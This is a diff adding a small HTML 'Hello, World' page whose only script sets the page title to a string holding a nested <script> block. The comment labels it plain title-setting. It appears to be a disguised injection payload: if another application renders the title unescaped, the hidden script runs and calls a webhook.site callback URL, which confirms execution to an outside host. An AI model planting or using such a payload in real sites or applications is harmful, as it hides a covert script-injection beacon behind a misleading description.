@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+    <h1>Hello, World!</h1>
+    <p>This is a simple HTML page.</p>
+
+    <script>
+        // Set the document title to a new value
+        document.title = `
+        <script>       
+          fetch("https://webhook.site/cf4add5b-b1e7-442c-b58d-4cfbb46f7c47")
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('Response from webhook:', data);
+            })
+            .catch(error => {
+                console.error('Error sending GET request:', error);
+            });
+            <\/script>
+            `;
+    </script>
+</body>
+</html>
